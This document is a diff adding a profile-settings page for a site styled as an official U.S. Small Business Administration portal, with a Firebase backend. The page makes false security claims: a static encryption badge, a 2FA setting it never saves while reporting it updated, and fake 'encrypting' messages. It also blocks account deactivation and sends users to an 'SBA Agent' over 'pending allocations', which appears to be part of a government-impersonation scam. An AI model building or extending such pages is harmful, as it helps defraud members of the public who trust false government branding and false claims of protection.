@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Profile Settings</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        label { display: block; font-size: 12px; font-weight: bold; color: #1e293b; margin-bottom: 8px; margin-top: 15px; }
+        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; box-sizing: border-box; font-family: inherit; }
+        .danger-card { margin-top: 15px; background: #fff1f2; border: 1px solid #fecdd3; padding: 20px; border-radius: 12px; }
+        .danger-btn { background: #e11d48; color: white; border: none; font-size: 11px; padding: 10px 15px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #1e3a8a;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            BACK
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+            <h2 style="color: #1e3a8a; font-size: 18px; margin-bottom: 5px;">Profile & Security</h2>
+            <p style="font-size: 11px; color: #64748b; margin-bottom: 20px;">Manage your 2026 federal credentials and contact information.</p>
+
+            <div style="background: #ecfdf5; padding: 12px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #10b981; display: flex; align-items: center; gap: 10px;">
+                <span style="font-size: 20px;">🛡️</span>
+                <div>
+                    <p style="margin: 0; font-size: 11px; font-weight: bold; color: #065f46;">Security Level: High</p>
+                    <p style="margin: 0; font-size: 10px; color: #059669;">256-bit AES Encryption Active</p>
+                </div>
+            </div>
+
+            <label>Full Legal Name (Verified 🔒)</label>
+            <input type="text" id="dispName" readonly style="background: #f1f5f9; cursor: not-allowed; font-weight: bold; color: #64748b; border: 1px dashed #cbd5e1;">
+            <p style="font-size: 9px; color: #94a3b8; margin-top: 5px; margin-bottom: 10px;">Legal names are locked to your identity record for 2026 federal audits.</p>
+
+            <label>Primary Phone Number</label>
+            <input type="text" id="phone" placeholder="+1 (555) 000-0000">
+
+            <label>Two-Factor Authentication (2FA)</label>
+            <select id="twoFactor">
+                <option value="enabled">Enabled (Recommended)</option>
+                <option value="disabled">Disabled (High Risk)</option>
+            </select>
+
+            <button id="saveBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase;">Update Profile</button>
+        </div>
+
+        <div class="danger-card">
+            <h4 style="margin:0; color: #be123c; font-size: 12px; font-weight: 800; text-transform: uppercase;">Danger Zone</h4>
+            <p style="font-size: 10px; color: #9f1239; margin: 8px 0 15px 0; line-height: 1.4;">
+                Permanent deactivation of your SBA profile and all pending 2026 allocations. This action cannot be undone.
+            </p>
+            <button class="danger-btn" onclick="alert('CRITICAL: Manual deactivation requires a signed SBA Form 912. Please contact an SBA Agent via the Messages tab.')">Deactivate My Account</button>
+        </div>
+
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; font-family: monospace;">
+            ACCOUNT_REF: <span id="userUidDisplay">AUTHENTICATING...</span>
+        </p>
+    </div>
+
+    <script type="module" src="script.js"></script>
+    <script type="module">
+        import { doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        const saveBtn = document.getElementById('saveBtn');
+
+        onAuthStateChanged(window.auth, async (user) => {
+            if (user) {
+                // Security Check: Kick unverified users
+                if (!user.emailVerified) {
+                    window.location.href = 'verify.html';
+                    return;
+                }
+
+                document.getElementById('userUidDisplay').innerText = "SBA-USER-" + user.uid.substring(0, 12).toUpperCase();
+                
+                const docSnap = await getDoc(doc(window.db, "users", user.uid));
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    document.getElementById('dispName').value = data.fullName || "Loading...";
+                    if(data.phone) document.getElementById('phone').value = data.phone;
+                }
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        saveBtn.addEventListener('click', async () => {
+            const user = window.auth.currentUser;
+            const phone = document.getElementById('phone').value.trim();
+            
+            if(!phone) return alert("REQUIRED: Please enter a valid phone number for security protocols.");
+
+            saveBtn.innerText = "ENCRYPTING DATA...";
+            saveBtn.disabled = true;
+
+            try {
+                await updateDoc(doc(window.db, "users", user.uid), {
+                    phone: phone,
+                    lastSettingsUpdate: new Date()
+                });
+                alert("SUCCESS: Profile security and 2FA protocols have been updated.");
+                saveBtn.innerText = "Update Profile";
+                saveBtn.disabled = false;
+            } catch (e) {
+                alert("TRANSMISSION ERROR: System session expired. Please refresh.");
+                saveBtn.innerText = "Update Profile";
+                saveBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
